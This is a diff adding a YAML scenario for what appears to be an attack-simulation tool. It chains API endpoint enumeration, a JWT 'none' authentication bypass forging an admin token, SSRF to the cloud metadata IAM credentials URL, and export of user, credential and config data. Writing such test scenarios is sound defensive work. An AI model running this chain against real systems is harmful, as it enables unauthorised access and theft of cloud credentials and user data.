@@ -1,0 +1,40 @@
+name: full-kill-chain
+description: "Full kill chain: recon -> initial access (auth_bypass) -> lateral movement (ssrf) -> exfiltration"
+mitre_technique_ids: ["T1595.003", "T1078.001", "T1552.005", "T1041"]
+tags: [combined, kill-chain, multi-stage, recon, initial-access, lateral-movement, exfil]
+severity: critical
+timeout: 20m
+steps:
+  - kind: api_enum
+    name: "Stage 1: Recon — endpoint discovery"
+    params:
+      base_path: /api
+      wordlist: builtin:api-paths-v1
+      methods: [GET]
+      concurrency: 10
+
+  - kind: auth_bypass
+    name: "Stage 2: Initial access — authentication bypass"
+    params:
+      endpoint: /api/v1/login
+      bypass_technique: jwt_none
+      original_token_param: valid_jwt
+      claims_override:
+        role: admin
+        sub: "1"
+
+  - kind: ssrf
+    name: "Stage 3: Lateral movement — SSRF to metadata"
+    params:
+      endpoint: /api/v1/fetch
+      url_param: url
+      target_url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      auth_token_param: forged_admin_jwt
+
+  - kind: data_exfil
+    name: "Stage 4: Exfiltration"
+    params:
+      endpoint: /api/v1/admin/export
+      method: GET
+      auth_token_param: forged_admin_jwt
+      expected_data_fields: [users, credentials, config]
